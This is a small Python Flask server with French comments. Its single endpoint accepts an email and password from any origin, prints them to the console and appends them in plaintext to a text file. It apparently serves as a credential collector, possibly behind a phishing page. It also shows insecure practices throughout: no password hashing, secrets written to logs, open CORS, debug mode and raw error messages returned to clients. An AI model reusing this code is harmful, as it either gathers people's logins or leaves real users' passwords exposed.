from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Permet les requêtes CORS (Cross-Origin Resource Sharing)

@app.route('/enregistrer', methods=['POST'])
def enregistrer():
    try:
        # Récupérer les données envoyées par le frontend en JSON
        data = request.get_json()

        # Vérifier que les données contiennent un email et un mot de passe
        if not data or 'email' not in data or 'password' not in data:
            return jsonify({"error": "Données invalides, email et mot de passe requis"}), 400

        email = data['email']
        password = data['password']

        # Afficher dans les logs pour vérifier que ça fonctionne
        print(f"Données reçues : Email = {email}, Mot de passe = {password}")

        # Enregistrer les données dans un fichier
        with open("data.txt", "a") as f:
            f.write(f"Email: {email}, Mot de passe: {password}\n")

        # Répondre au frontend que les données ont été enregistrées avec succès
        return jsonify({"message": "Données enregistrées avec succès"}), 200

    except Exception as e:
        # Si une erreur se produit sur le serveur, renvoyer une erreur
        return jsonify({"error": f"Erreur serveur : {str(e)}"}), 500

if __name__ == '__main__':
    app.run(debug=True)  # Démarrer le serveur en mode debug pour faciliter le développement
